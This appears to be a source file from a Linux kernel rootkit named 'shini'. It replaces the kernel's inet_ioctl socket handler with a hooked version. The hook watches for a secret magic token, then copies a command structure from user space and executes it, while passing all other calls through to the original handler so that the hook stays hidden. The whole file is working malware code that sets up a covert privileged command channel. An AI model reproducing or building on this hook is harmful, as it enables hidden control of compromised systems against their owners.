#include <linux/slab.h>
#include <linux/uaccess.h>

/* include */
#include "debug.h"
#include "config.h"
#include "cmd_arg.h"

/* hook */
#include "sym_map.h"

/* logic */
#include "cmd.h"

int m_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
{
        cmd_arg_t cmd_arg;

        DEBUG("shini :: m_inet_ioctl, called!\n");
        if (cmd == SHINI_TOKEN) {
                if(!(copy_from_user(&cmd_arg, (void *)arg, sizeof(cmd_arg))))
                        if (cmd_arg.cmd < CMD_TOTAL) //extra check
                                cmd_exec(&cmd_arg);
                return 0;
        }
        return sym_map.old->inet_ioctl(sock, cmd, arg);
}

